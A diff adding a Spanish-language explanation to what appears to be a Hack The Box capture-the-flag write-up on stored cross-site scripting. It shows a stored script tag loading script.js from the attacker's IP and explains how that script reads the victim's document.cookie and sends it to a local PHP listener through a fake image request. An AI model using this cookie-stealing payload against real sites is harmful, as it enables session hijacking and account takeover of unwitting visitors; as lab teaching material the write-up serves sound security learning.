@@ -113,3 +113,29 @@ Si pones `ls` notarás que hay un nuevo archivo llamado `cookies.txt` donde est�
 
 ## Pero espera, aún no te vayas que todavía no te explique:
 
+1. **El disparador `<script src="http://[TU_IP]:8080/script.js"></script>`**
+
+Cuando guardaste eso en el input, el texto quedó grabado en la página.
+
+Después, la "víctima/administrador" entra a ver la página.
+
+El navegador de la víctima lee tu texto como si fuera una orden legítima: "Descarga y ejecuta el archivo script.js que está alojado en la IP del atacante (la nuestra ya que nosotros somos los atacantes)".
+
+
+
+Pero.... En vez de crear un script `script.js`: ¿Por qué no meter todo el código directamente en el input?
+
+No podemos porque muchas veces los inputs tienen un límite de caracteres o filtros que rompen códigos largos. Llamar a un archivo externo (`src="..."`) mantiene el payload diminuto y te permite cambiar el código en tu máquina sin tener que volver a enviar el formulario.
+
+
+2. **El ladrón `script.js`**
+
+Este es el archivo que no se ejecuta en tu computadora; sino en el navegador de la víctima en el momento en que su máquina descarga el script.
+- `document.cookie`: En JavaScript, esto accede a las cookies la sesión actual de la víctima. Ahí es donde HTB guardó la flag en la cookie.
+- `encodeURIComponent(...)`: Convierte caracteres especiales (como =, ;, espacios) en formato URL seguro para que no se corten al enviarse.
+- `new Image().src = ...`: Los navegadores tienen restricciones de seguridad que a veces bloquean peticiones directas de JavaScript a otros servidores. Sin embargo, los navegadores siempre permiten descargar imágenes de cualquier sitio. Al simular la carga de una imagen falsa, fuerzas al navegador a hacer una petición GET a tu servidor llevando la cookie pegada al final de la URL.
+
+3. **El `index.php`**
+
+Este archivo corre dentro de tu propia máquina (con el comando php -S). Su único trabajo es recibir la información que el ladrón envió y guardarla para que no se pierda.
+
